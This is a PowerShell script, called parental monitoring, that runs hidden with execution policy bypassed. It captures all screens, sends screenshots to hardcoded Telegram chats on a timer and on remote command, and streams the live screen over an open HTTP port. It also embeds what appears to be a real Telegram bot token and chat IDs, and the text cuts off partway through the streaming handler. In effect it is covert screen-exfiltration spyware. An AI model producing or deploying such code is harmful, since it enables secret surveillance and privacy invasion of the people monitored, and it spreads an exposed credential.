<#
monitor_bot.ps1
PowerShell version of your parental-monitoring script:
- Captures monitors, combines side-by-side
- Streams MJPEG on /stream?token=...
- Short link at /s
- Sends screenshots to Telegram chats
- Auto-loop screenshots
- Polls Telegram getUpdates for /screenshot command

Run:
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\monitor_bot.ps1

Notes:
- Best on Windows PowerShell 5.1 (System.Drawing available).
- Open STREAM_PORT in firewall if you want access from other devices.
#>

# ----------------------------
# CONFIG - edit these
# ----------------------------
$TOKEN = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"    # Telegram bot token
$CHAT_IDS = @(7208529004, 1399455903, 901578154)          # Allowed chat IDs (integers)
$STREAM_PORT = 5000
$STREAM_TOKEN = "ZGFza2pkaGFranNkaGthanNkaGtpb2xxa2pmZ2RuZGlmZ2p5OTI0MzU2NzkzNDU3OTM0a2JuamZramRoZmtqYmRramZoc2Y="
$FRAME_INTERVAL = 0.8   # seconds between MJPEG frames
$JPEG_QUALITY = 50      # 0-100
$AUTO_INTERVAL = 300    # seconds between auto screenshots to Telegram
$RESIZE_SCALE = 0.5     # 0.0-1.0 scale for downsizing
$LOG_FILE = "monitor_bot.log"

# Temp file for sending photos
$global:tempJpg = [IO.Path]::Combine($env:TEMP, "monitor_bot_temp.jpg")

function Log {
    param([string]$msg, [string]$level = "INFO")
    $entry = "{0} - {1} - {2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $level, $msg
    $entry | Out-File -FilePath $LOG_FILE -Append -Encoding utf8
    # Also write to console for foreground runs
    Write-Output $entry
}

# ----------------------------
# Capture functions
# ----------------------------
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Capture-MonitorBitmap {
    param([int]$monitorIndex = 1)
    try {
        $screens = [System.Windows.Forms.Screen]::AllScreens
        if ($monitorIndex -lt 1 -or $monitorIndex -gt $screens.Length) {
            Log "Invalid monitor index $monitorIndex; using 1" "WARN"
            $monitorIndex = 1
        }
        $screen = $screens[$monitorIndex - 1]  # zero-based
        $rect = $screen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
        $g.Dispose()
        return $bmp
    } catch {
        Log "Capture-MonitorBitmap error: $_" "ERROR"
        return $null
    }
}

function Capture-CombinedImageBytes {
    try {
        $bmp1 = Capture-MonitorBitmap -monitorIndex 1
        if (-not $bmp1) { throw "Failed to capture monitor 1" }
        $bmp2 = $null
        if ([System.Windows.Forms.Screen]::AllScreens.Count -ge 2) {
            try {
                $bmp2 = Capture-MonitorBitmap -monitorIndex 2
            } catch {
                Log "Could not capture monitor 2: $_" "WARN"
                $bmp2 = $null
            }
        }

        if ($RESIZE_SCALE -lt 1.0) {
            $newW1 = [int]($bmp1.Width * $RESIZE_SCALE)
            $newH1 = [int]($bmp1.Height * $RESIZE_SCALE)
            $scaled1 = New-Object System.Drawing.Bitmap $newW1, $newH1
            $g1 = [System.Drawing.Graphics]::FromImage($scaled1)
            $g1.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
            $g1.DrawImage($bmp1, 0, 0, $newW1, $newH1)
            $g1.Dispose()
            $bmp1.Dispose()
            $bmp1 = $scaled1

            if ($bmp2) {
                $newW2 = [int]($bmp2.Width * $RESIZE_SCALE)
                $newH2 = [int]($bmp2.Height * $RESIZE_SCALE)
                $scaled2 = New-Object System.Drawing.Bitmap $newW2, $newH2
                $g2 = [System.Drawing.Graphics]::FromImage($scaled2)
                $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $g2.DrawImage($bmp2, 0, 0, $newW2, $newH2)
                $g2.Dispose()
                $bmp2.Dispose()
                $bmp2 = $scaled2
            }
        }

        if ($bmp2) {
            $width = $bmp1.Width + $bmp2.Width
            $height = [Math]::Max($bmp1.Height, $bmp2.Height)
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp2, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose()
            $bmp2.Dispose()
        } else {
            # Duplicate monitor1 if only one monitor
            $width = $bmp1.Width * 2
            $height = $bmp1.Height
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp1, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose()
        }

        # Save to memory stream as JPEG with quality
        $ms = New-Object System.IO.MemoryStream
        $encoders = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()
        $jpegCodec = $encoders | Where-Object { $_.MimeType -eq "image/jpeg" } | Select-Object -First 1
        $params = New-Object System.Drawing.Imaging.EncoderParameters 1
        $qualityParam = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int]$JPEG_QUALITY)
        $params.Param[0] = $qualityParam
        $combined.Save($ms, $jpegCodec, $params)
        $combined.Dispose()
        $ms.Seek(0, 'Begin') | Out-Null
        $bytes = $ms.ToArray()
        $ms.Dispose()
        return $bytes
    } catch {
        Log "Capture-CombinedImageBytes error: $_" "ERROR"
        return $null
    }
}

# ----------------------------
# Telegram functions
# ----------------------------
function Send-StartMessage {
    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $id; text = "Script Started ✅" } -ErrorAction Stop
        } catch {
            Log "Error sending start msg to $id: $_" "ERROR"
        }
    }
    Send-CombinedScreenshot
}

function Send-CombinedScreenshot {
    $bytes = Capture-CombinedImageBytes
    if (-not $bytes) { Log "No image bytes to send" "WARN"; return }
    try {
        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)
        foreach ($id in $CHAT_IDS) {
            try {
                $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"
                $form = @{
                    chat_id = $id
                    caption = "Screen 1`n`nScreen 2"
                    photo = Get-Item $global:tempJpg
                }
                Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
            } catch {
                Log "Error sending screenshot to $id: $_" "ERROR"
            }
        }
    } catch {
        Log "Error saving/sending screenshot: $_" "ERROR"
    } finally {
        if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue }
    }
}

function Send-ClosedMessage {
    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $id; text = "Script Closed ❌" } -ErrorAction Stop
        } catch {
            Log "Error sending closed msg to $id: $_" "ERROR"
        }
    }
}

# ----------------------------
# Auto-screenshot loop (background job)
# ----------------------------
function Start-AutoScreenshotLoop {
    Start-Job -Name "AutoScreenshot" -ScriptBlock {
        param($TOKEN, $CHAT_IDS, $AUTO_INTERVAL)
        # Re-import functions/defs by dot-sourcing this file inside job
        $scriptPath = $MyInvocation.MyCommand.Path
        . $scriptPath
        while ($true) {
            try {
                Send-CombinedScreenshot
            } catch {
                Log "Auto loop error: $_" "ERROR"
            }
            Start-Sleep -Seconds $AUTO_INTERVAL
        }
    } -ArgumentList $TOKEN, $CHAT_IDS, $AUTO_INTERVAL | Out-Null
    Log "Started AutoScreenshot background job"
}

# ----------------------------
# Telegram poller (checks for messages like /screenshot)
# ----------------------------
$global:tgOffset = 0
function Start-TelegramPoller {
    Start-Job -Name "TGPoller" -ScriptBlock {
        param($TOKEN, $CHAT_IDS)
        $scriptPath = $MyInvocation.MyCommand.Path
        . $scriptPath
        while ($true) {
            try {
                $url = "https://api.telegram.org/bot$TOKEN/getUpdates"
                $resp = Invoke-RestMethod -Uri $url -Method Get -Body @{ offset = $script:tgOffset } -ErrorAction Stop
                if ($resp.ok -and $resp.result.Count -gt 0) {
                    foreach ($u in $resp.result) {
                        $script:tgOffset = [int]$u.update_id + 1
                        if ($u.message) {
                            $chatId = $u.message.chat.id
                            $text = $u.message.text
                            if ($text -eq "/screenshot" -and ($CHAT_IDS -contains $chatId)) {
                                Send-CombinedScreenshot
                            } else {
                                Log "Ignored telegram msg from $chatId: $text" "INFO"
                            }
                        }
                    }
                }
            } catch {
                Log "Telegram poller error: $_" "ERROR"
            }
            Start-Sleep -Seconds 2
        }
    } -ArgumentList $TOKEN, $CHAT_IDS | Out-Null
    Log "Started Telegram poller background job"
}

# ----------------------------
# Simple MJPEG stream via HttpListener
# ----------------------------
function Start-HttpStream {
    param([int]$Port, [string]$StreamToken)
    $listener = New-Object System.Net.HttpListener
    $prefix = "http://+:$Port/"
    $listener.Prefixes.Add($prefix)
    try {
        $listener.Start()
    } catch {
        Log "Failed to start HttpListener on $Port: $_" "ERROR"
        throw $_
    }
    Log "HttpListener started on port $Port"
    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            Start-Job -ScriptBlock {
                param($ctx, $StreamToken, $FRAME_INTERVAL)
                $req = $ctx.Request
                $resp = $ctx.Response
                $qs = $req.Url.Query
                # Quick token check param 'token'
                $q = [System.Web.HttpUtility]::ParseQueryString($qs)
                $token = $q.Get("token")
                if (-not $token -or $token -ne $StreamToken) {
                    $resp.StatusCode = 401
                    $resp.Close()
                    Log "Unauthorized stream access attempt from $($req.RemoteEndPoint)" "WARN"
                    return
                }
                $boundary = "--frame"
                $resp.ContentType = "multipart/x-mixed-replace; boundary=$boundary"
                $resp.SendChunked = $true
                $out = $resp.OutputStream
                try {
                    while ($true) {
                        $bytes = Capture-CombinedImageBytes
                        if ($bytes) {
                            $hdr = "`r`n$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n"
                            $hdrBytes = [System.Text.Encoding]::ASCII.GetBytes($hdr)
                            $out.Write($hdrBytes, 0, $hdrBytes.Length)
                            $out.Write($bytes, 0, $bytes.Length)
                            $out.Flush()
                        }
                        Start-Sleep -Seconds $FRAME_INTERVAL
                    }
                } catch {
                    # client disconnected or other error
                } finally {
                    $out.Close()
                    $resp.Close()
                }
            } -ArgumentList $ctx, $StreamToken, $FRAME_INTERVAL | Out-Null
        } catch {
            Log "HttpListener accept error: $_" "ERROR"
        }
    }
}

# /s handler - returns a small HTML that embeds the stream
function Start-ShortPage {
    param([int]$Port, [string]$StreamToken)
    $listener = New-Object System.Net.HttpListener
    $prefix = "http://+:$Port/"
    $listener.Prefixes.Add($prefix)
    # Using the same listener above; so we won't start separately. This helper is left for conceptual clarity.
}

# ----------------------------
# Run the components
# ----------------------------
try {
    Log "Script starting"
    Send-StartMessage
    Start-AutoScreenshotLoop
    Start-TelegramPoller

    # Start HTTP listener (blocking): handles /stream and returns simple /s HTML and MJPEG streaming
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://+:$STREAM_PORT/")
    $listener.Start()
    Log "Short stream URL: http://$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.Address -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 1 -ExpandProperty IPAddress)):$STREAM_PORT/s"
    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            $req = $ctx.Request
            $resp = $ctx.Response
            $path = $req.Url.AbsolutePath
            if ($path -eq "/s") {
                $html = "<html><head><title>Live Stream</title><style>body{margin:0;}img{width:100%;height:auto;}</style></head><body><img src='/stream?token=$STREAM_TOKEN' /></body></html>"
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
                $resp.ContentType = "text/html; charset=utf-8"
                $resp.ContentLength64 = $bytes.Length
                $resp.OutputStream.Write($bytes, 0, $bytes.Length)
                $resp.Close()
            } elseif ($path -eq "/stream") {
                # Hand off streaming to a job similar to Start-HttpStream to avoid blocking further accepts
                Start-Job -ScriptBlock {
                    param($ctx, $STREAM_TOKEN, $FRAME_INTERVAL)
                    $req = $ctx.Request; $resp = $ctx.Response
                    $q = [System.Web.HttpUtility]::ParseQueryString($req.Url.Query)
                    $token = $q.Get("token")
                    if (-not $token -or $token -ne $STREAM_TOKEN) {
                        $resp.StatusCode = 401
                        $resp.Close()
                        Log "Unauthorized stream access attempt from $($req.RemoteEndPoint)" "WARN"
